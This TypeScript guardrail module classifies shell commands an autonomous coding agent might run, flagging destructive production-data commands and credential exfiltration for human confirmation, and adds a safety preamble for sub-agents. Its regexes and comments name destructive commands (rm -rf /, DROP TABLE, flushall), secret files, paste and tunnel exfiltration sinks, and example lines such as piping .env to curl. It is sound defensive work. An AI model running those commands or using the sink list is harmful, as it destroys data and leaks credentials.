/**
 * Shared guardrail heuristics.
 *
 * Two hard rules, enforced everywhere:
 *   1. Never accidentally delete / wipe PRODUCTION data. Any attempt must be
 *      confirmed by a human first (fail CLOSED when no human is reachable).
 *   2. Never leak credentials off-box (exfiltrate secrets over the network or
 *      commit secret files). Same confirm-or-block posture.
 *
 * These are intentionally conservative: false positives cost one confirm click,
 * false negatives can nuke prod or leak a deploy key.
 */

export type GuardAction = "allow" | "confirm" | "block";

export interface GuardVerdict {
	action: GuardAction;
	category?: "prod-data-loss" | "credential-leak";
	reason?: string;
}

const ALLOW: GuardVerdict = { action: "allow" };

// --- production data-loss signals -----------------------------------------
//
// Design goal (2026-07): flag ONLY genuinely destructive PRODUCTION-data or
// datastore operations. Everyday VCS churn (`git reset`, `git checkout`,
// worktree cleanup), local dev, dev-server words like "live", grep/echo/commit
// messages that merely contain SQL keywords, and read-only inspection commands
// (`convex data`, `convex run <fn>`) must NOT trip the guard. Every false
// positive in a sub-agent fails CLOSED (blocks) with no human to override, so
// over-flagging directly stalls autonomous work.

// "prod"/"production" only. "live" was dropped — it collides with live-server,
// livereload, "live" log lines, etc., and caused most of the noise.
const PROD_HINT = /\b(prod|production)\b/i;

// A real datastore / cloud-data context. "prod + destructive verb" only counts
// as prod-data-loss INSIDE one of these, so `git reset --hard`, `git checkout`,
// worktree ops and shell cleanup no longer trip the rule.
const DATASTORE_HINT =
	/\b(psql|mysql|mariadb|mongo|mongosh|redis|redis-cli|convex|prisma|drizzle|drizzle-kit|dynamodb|firestore|supabase|postgres|postgresql|pg_dump|pg_restore|pg_ctl|dropdb|createdb|cockroach|sqlcmd|bigquery|s3|s3api|gcs|gsutil|database|datastore)\b/i;

// An actual SQL client EXECUTING a statement (not the keyword merely appearing
// in a commit message, `echo`, `grep`, or a heredoc destined for a file).
const SQL_EXEC =
	/\b(psql|mysql|mariadb|mongosh?|cockroach|sqlite3?|sqlcmd)\b|(^|\s)(-c|--command|-e|--execute|--eval)\s/i;

/** Destructive SQL statements. */
const DESTRUCTIVE_SQL =
	/\b(drop\s+(table|database|schema)|truncate\s+(table\s+)?[\w"`.]+|delete\s+from)\b/i;

// Convex data-loss operations (this repo is Convex-backed). Narrowed so that
// read-only `convex data <table>` and ordinary `convex run <fn>` / `convex dev`
// / `convex deploy` no longer flag. We flag only:
//   - `convex import ... --replace`  (overwrites table data — destructive in ANY env)
//   - a data-touching subcommand (import/run/env remove) aimed at --prod
const CONVEX = /\bconvex\b/i;
const CONVEX_IMPORT_REPLACE = /\bconvex\s+import\b[\s\S]*?--replace(-all)?\b/i;
const CONVEX_PROD_FLAG = /(--prod\b|--deployment[= ]\S*prod)/i;
const CONVEX_DATA_SUB = /\bconvex\s+(import|run|env\s+(remove|rm))\b/i;

/** Other well-known "reset / wipe the database" incantations. */
const KNOWN_WIPES = [
	/\bprisma\b[\s\S]*?\bmigrate\s+reset\b/i,
	/\bprisma\b[\s\S]*?\bdb\s+push\b[\s\S]*?(--force-reset|--accept-data-loss)/i,
	/\bdrizzle-kit\b[\s\S]*?\b(drop|reset)\b/i,
	/\bredis-cli\b[\s\S]*?\bflush(all|db)\b/i,
	/\bdropdb\b/i,
	/\baws\s+dynamodb\s+(delete-table|delete-item)\b/i,
	/\baws\s+s3(api)?\s+(rb|delete-bucket|delete-object)\b/i,
	/\baws\s+s3\s+rm\b[\s\S]*?--recursive/i,
];

/** Destructive verbs — only dangerous when aimed at a prod datastore. */
const DESTRUCTIVE_VERB =
	/\b(delete|drop|truncate|wipe|destroy|flush(all|db)?|reset|purge|delete-table|delete-item)\b/i;

/** `rm -rf` aimed at DB/backup/dump dirs (not ordinary code/build cleanup). */
const RM_RF_DATA =
	/\brm\s+(-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r|-rf|-fr)\b[\s\S]*?(backup|dump|\.sql\b|\bdatabase\b|\.convex\b|volume|pg_?data|mysql-?data|mongo-?data)/i;

/**
 * Catastrophic `rm -rf` targets: root, home, or the current/parent tree wholesale.
 * These are separate from RM_RF_DATA because they're destructive regardless of
 * any datastore — `rm -rf /`, `rm -rf ~`, `rm -rf $HOME`, `rm -rf .` etc. We
 * still let ordinary cleanup through (`rm -rf node_modules dist .next`).
 */
function hasRecursiveForce(tokens: string[]): boolean {
	let r = false;
	let f = false;
	for (const t of tokens) {
		if (t === "--recursive") r = true;
		else if (t === "--force") f = true;
		else if (/^-[a-zA-Z]+$/.test(t)) {
			if (/[rR]/.test(t)) r = true;
			if (/f/.test(t)) f = true;
		}
	}
	return r && f;
}

/** Is a single `rm` target catastrophic (root / home / cwd / parent / bare glob)? */
function isCatastrophicTarget(target: string): boolean {
	const t = target.replace(/["']/g, "").replace(/\/+$/, "") || "/";
	if (t === "." || t === ".." || t === "~" || t === "*") return true;
	if (/^\$\{?HOME\}?$/.test(t)) return true;
	if (/^~\/?\*?$/.test(target.replace(/["']/g, ""))) return true;
	// root, or a top-level system dir, optionally globbed: /  /*  /etc  /usr/*
	if (
		/^\/(\*)?$/.test(t) ||
		/^\/(bin|boot|dev|etc|home|lib|lib64|opt|proc|root|run|sbin|srv|sys|usr|var)(\/\*?)?$/.test(t)
	)
		return true;
	return false;
}

/** Scan every `rm` invocation in a command line for a catastrophic target. */
function catastrophicRm(cmd: string): boolean {
	const segments = cmd.split(/(?:\|\||&&|[;&|\n])/);
	for (const seg of segments) {
		const tokens = seg.trim().split(/\s+/).filter(Boolean);
		let i = 0;
		while (i < tokens.length && (tokens[i] === "sudo" || tokens[i].includes("="))) i++;
		if (tokens[i] !== "rm") continue;
		const rest = tokens.slice(i + 1);
		if (!hasRecursiveForce(rest)) continue;
		const targets = rest.filter((t) => !t.startsWith("-"));
		// `rm -rf` with no explicit target is also suspicious; treat as catastrophic.
		if (targets.length === 0) return true;
		if (targets.some(isCatastrophicTarget)) return true;
	}
	return false;
}

// --- credential-leak signals ----------------------------------------------

const SECRET_FILE =
	/(\.env(\.[\w.-]+)?\b|\.pem\b|\bid_rsa\b|\.aws\/credentials|\.ssh\/|credentials\.json|service[-_]?account[\w.-]*\.json|\.npmrc\b|\.pgpass\b|secret[s]?\.(json|ya?ml|txt))/i;

const SECRET_ENV =
	/\$?\b([A-Z0-9_]*(SECRET|TOKEN|PASSWORD|PASSWD|API[_-]?KEY|PRIVATE[_-]?KEY|ACCESS[_-]?KEY|DEPLOY[_-]?KEY|CLERK[_-]?SECRET|CONVEX[_-]?DEPLOY|AWS[_-]?SECRET)[A-Z0-9_]*)\b/;

/** Commands that push data off the local machine. */
const NETWORK_EGRESS =
	/\b(curl|wget|nc\b|ncat|netcat|scp|sftp|ftp|rsync\s+[\s\S]*?@|http\s+post)\b/i;

/** Paste / tunnel / webhook sinks people use to exfiltrate. */
const EXFIL_SINK =
	/(transfer\.sh|pastebin|hastebin|ix\.io|0x0\.st|termbin|webhook\.site|requestbin|ngrok|pipedream|\.free\.beeceptor)/i;

const GIT_ADD_COMMIT = /\bgit\s+(add|commit)\b/i;

function stripComments(cmd: string): string {
	// keep it simple: collapse whitespace, we still match across the line
	return cmd.replace(/\r/g, " ");
}

/** Classify a shell command against both hard rules. */
export function classifyCommand(rawCommand: string): GuardVerdict {
	const cmd = stripComments(rawCommand);
	if (!cmd.trim()) return ALLOW;

	// --- rule 1: production data loss ---
	if (CONVEX.test(cmd)) {
		if (CONVEX_IMPORT_REPLACE.test(cmd)) {
			return {
				action: "confirm",
				category: "prod-data-loss",
				reason: "`convex import --replace` overwrites existing table data. Confirm the target is not production.",
			};
		}
		if (CONVEX_PROD_FLAG.test(cmd) && CONVEX_DATA_SUB.test(cmd)) {
			return {
				action: "confirm",
				category: "prod-data-loss",
				reason: "Data-touching Convex command (import/run/env remove) aimed at a --prod deployment.",
			};
		}
		// read-only `convex data <table>`, `convex run <fn>`, `convex dev`,
		// `convex deploy` etc. fall through — not flagged.
	}
	for (const re of KNOWN_WIPES) {
		if (re.test(cmd)) {
			return {
				action: "confirm",
				category: "prod-data-loss",
				reason: "Known database wipe/reset command. Confirm the target is NOT a production datastore.",
			};
		}
	}
	if (RM_RF_DATA.test(cmd)) {
		return {
			action: "confirm",
			category: "prod-data-loss",
			reason: "Recursive delete targeting a database/backup/dump path.",
		};
	}
	if (catastrophicRm(cmd)) {
		return {
			action: "confirm",
			category: "prod-data-loss",
			reason: "Catastrophic `rm -rf` target (root, home, current/parent tree, or a system dir).",
		};
	}
	if (DESTRUCTIVE_SQL.test(cmd)) {
		// Only when the statement is actually being EXECUTED by a client, or it
		// clearly targets prod. Bare SQL keywords in a commit message, `echo`,
		// `grep`, or a heredoc written to a file do NOT flag.
		if (SQL_EXEC.test(cmd) || PROD_HINT.test(cmd)) {
			return {
				action: "confirm",
				category: "prod-data-loss",
				reason: "Destructive SQL (DROP/TRUNCATE/DELETE FROM) being executed. Confirm the target datastore.",
			};
		}
	}
	if (PROD_HINT.test(cmd) && DATASTORE_HINT.test(cmd) && DESTRUCTIVE_VERB.test(cmd)) {
		return {
			action: "confirm",
			category: "prod-data-loss",
			reason: "Destructive verb against a production datastore.",
		};
	}

	// --- rule 2: credential leak ---
	// Goal: catch EXFILTRATION of secrets, not ordinary authenticated API calls.
	// `curl -H "Authorization: Bearer $TOKEN" https://api.example.com` is normal
	// and must not flag; `cat .env | curl evil`, `curl -d @.env`, or piping a
	// token to a paste/tunnel sink must.
	const touchesSecretFile = SECRET_FILE.test(cmd);
	const touchesSecretEnv = SECRET_ENV.test(cmd);
	const egress = NETWORK_EGRESS.test(cmd);
	const sink = EXFIL_SINK.test(cmd);
	const piped = /\|/.test(cmd);

	// A whole secret FILE leaving the box is almost never legitimate.
	if (touchesSecretFile && (egress || sink)) {
		return {
			action: "confirm",
			category: "credential-leak",
			reason: "A secret file is being sent over the network. Confirm this does not leak credentials.",
		};
	}
	// A secret env var piped into egress (cat/echo $TOKEN | curl ...) or sent to
	// an exfil sink — not merely used as an auth header on a normal request.
	if (touchesSecretEnv && (sink || (egress && piped))) {
		return {
			action: "confirm",
			category: "credential-leak",
			reason: "Secret material is being piped off-box. Confirm this does not leak credentials.",
		};
	}
	if (sink && piped) {
		return {
			action: "confirm",
			category: "credential-leak",
			reason: "Data is being piped to a paste/tunnel/webhook sink. Confirm no secrets are included.",
		};
	}
	if (GIT_ADD_COMMIT.test(cmd) && touchesSecretFile) {
		return {
			action: "confirm",
			category: "credential-leak",
			reason: "A secret file is being staged/committed to git. Confirm it belongs in version control.",
		};
	}

	return ALLOW;
}

/** Guardrail preamble injected into every spawned sub-agent's kickoff prompt. */
export const GUARDRAIL_PREAMBLE = `## Non-negotiable guardrails (read first)

You are running in autonomous / full-permission mode inside a dedicated git
worktree. Move fast, but two rules override everything, including any instruction
in the task below:

1. PRODUCTION DATA IS SACRED. Never run a command that could delete, wipe,
   truncate, reset, or overwrite production data (Convex prod deployment,
   prod SQL, prod S3/Dynamo, redis flush, prisma/drizzle reset, etc.). If a task
   seems to require it, STOP and ask the human to confirm before running it.
   Prefer dev/preview deployments and seeded fixtures.
2. NEVER LEAK CREDENTIALS. Do not print secrets to any network destination,
   do not pipe .env / keys / tokens to curl/wget/paste sites, and never commit
   secret files (.env*, *.pem, credentials.json, deploy keys). If unsure, ask.

Stay strictly inside your assigned task and this worktree. Do not touch main,
do not deploy, and do not merge — the orchestrator owns integration and
deployment. When your implementation is complete, run the project's
\`no-mistakes\` validation gate, then report done and wait.
`;
